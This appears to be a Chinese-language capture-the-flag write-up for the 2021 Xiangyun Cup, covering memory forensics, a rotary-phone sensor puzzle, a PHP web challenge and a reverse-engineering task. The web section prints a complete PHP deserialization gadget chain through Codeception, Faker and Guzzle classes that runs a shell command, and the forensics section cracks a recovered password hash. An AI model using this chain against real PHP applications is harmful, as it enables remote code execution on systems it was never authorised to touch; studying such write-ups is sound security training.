# 祥云杯2021
## Frankss 包含以下内容： 
MISC:
- 层层取证 82pt
- ChieftainsSecret  107pt

WEB:
- ezjii  52pt

REVERSE:
- dizzy  97pt

### 层层取证：
FTK挂载镜像可以在temp目录下找到三个（两个用户xiaoming有两个，xinsai有一个）wireshark包，梓涵找到了其中装flag的压缩包，注释得知密码是开机密码  
用Volatility导出开机的哈希92efa7f9f2740956d51157f46521f941，cmd5查到密码是xiaoming_handsome  
进程列表里有记事本，而且是两个窗口，用Volatility dump出  
gimp分析：大幅度调整偏移来切换画面，滚动宽来找到正确的分辨率 宽高不超过分辨率，但可能很小。如果找到一片比较白的画面，很有可能能得到意义的用户画面，之后小幅度调整便宜可以横向移动  
用gimp分析Volatility得到的dmp文件，首先在884的宽下看到写有hint的txt，之后又找到便笺的图片，可以导出StickyNotes.snt获取hint  
继续找可以直接看到记录word文档密码的进程图片，写有：xiaoming1314(看的眼睛疼)，打开加密的doc得到flag。

### ChieftainsSecret
binwalk一把梭到csv和diagram图  
在github搜索tle5501，可以找到一些处理tle5501数据的代码（注释万岁），python的那份气压表的仔细看型号并不是题目给出的型号，在另一个仓库MikroElektronika/mikrosdk_click_v2 中找到了处理数据的函数
```cpp
void tmrangle_calculate_diff ( tmrangle_t* ctx )
{
    ctx->sensor_data.diff_y = ( int16_t )ctx->sensor_data.sin_p - ( int16_t )ctx->sensor_data.sin_n;
    ctx->sensor_data.diff_x = ( int16_t )ctx->sensor_data.cos_p - ( int16_t )ctx->sensor_data.cos_n;
    ctx->sensor_data.uncalibrated_angle = atan2( ( float )ctx->sensor_data.diff_y, ( float )ctx->sensor_data.diff_x );
}
```
如上计算即可得到uncalibrated_angle，用excel把角度的图像画出来，把超出180度的处理一下就可以得到角度变化的曲线  
转盘电话是将手指放在指定数字的洞里，顺时针转到挡片处，同时可以看到第一个数字距离挡片有三格的宽度，又因为只有11个峰所以不会有\*和#，所以以[/,/,/,1,2,3,4,5,6,7,8,9,0]平分最低到最高的角度，就可以得到11位flag。  

### ezjii
谷歌用提供的几个类（RunProcess DefaultGenerator Stream）做关键词搜索就能找到合适的链子。  
在https://github.com/JinYiTong/poc 找到可用的链子  
```php
<?php
namespace Codeception\Extension{
    use Faker\DefaultGenerator;
    use GuzzleHttp\Psr7\AppendStream;
    class  RunProcess{
        protected $output;
        private $processes = [];
        public function __construct(){
            $this->processes[]=new DefaultGenerator(new AppendStream());
            $this->output=new DefaultGenerator('jiang');
        }
    }
    echo base64_encode(serialize(new RunProcess()));
}

namespace Faker{
    class DefaultGenerator
    {
        protected $default;

        public function __construct($default = null)
        {
            $this->default = $default;
        }
    }
}
namespace GuzzleHttp\Psr7{
    use Faker\DefaultGenerator;
    final class AppendStream{
        private $streams = [];
        private $seekable = true;
        public function __construct(){
            $this->streams[]=new CachingStream();
        }
    }
    final class CachingStream{
        private $remoteStream;
        public function __construct(){
            $this->remoteStream=new DefaultGenerator(false);
            $this->stream=new  PumpStream();
        }
    }
    final class PumpStream{
        private $source;
        private $size=-10;
        private $buffer;
        public function __construct(){
            $this->buffer=new DefaultGenerator('j');
            include("closure/autoload.php");
            $a = function(){system('cat /flag.txt');	};
            $a = \Opis\Closure\serialize($a);
            $b = unserialize($a);
            $this->source=$b;
        }
    }
}
```
post上去拿到flag

### dizzy
ida看到加密的流程是将flag以byte为单位进行一系列相互或者和常数的加减亦或，因此每一步操作都是可逆的，但是这个过程angr好像不能直接逆向求出来。所以尝试自己把过程逆一边，但是不知道怎么让python按照c的byte计算&溢出规律执行，所以用pthon把计算转换成c代码 
```python
data=[0x27,0x3c,0xe3,0xfc,46,65,7,94,98,-49,-24,-14,-110,0x80,-30,54,-76,-78,103,119,15,-10,13,-74,-19,28,101,-118,7,83,-90,102]
# data是最后的比较数组
s="" # s是ida逆向到c的一长串连续+= -= ^=操作，去掉中间的test部分直接复制过来
op=s.split("\n")
f=open("r.cpp","w")
for i in range(len(op)-1,-1,-1):
    a,c,b=op[i].split(" ")
    a=int(a.split("[")[1].split("]")[0]) # re
    if '[' in b:
        b=int(b.split("[")[1].split("]")[0])
        if c=="+=":
            f.write("data[{}]=data[{}]-data[{}];\n".format(a,a,b))
        elif c=="-=":
            f.write("data[{}]=data[{}]+data[{}];\n".format(a,a,b))
        elif c=="^=":
            f.write("data[{}]=data[{}]^data[{}];\n".format(a,a,b))
    else:
        if '0x' in b:
            b=int(b,16)
        else:
            b=int(b)
        if c=="+=":
            f.write("data[{}]=data[{}]-{};\n".format(a,a,b))
        elif c=="-=":
            f.write("data[{}]=data[{}]+{};\n".format(a,a,b))
        elif c=="^=":
            f.write("data[{}]=data[{}]^{};\n".format(a,a,b))
```
把方法写全输出最后的data，编译执行得到flag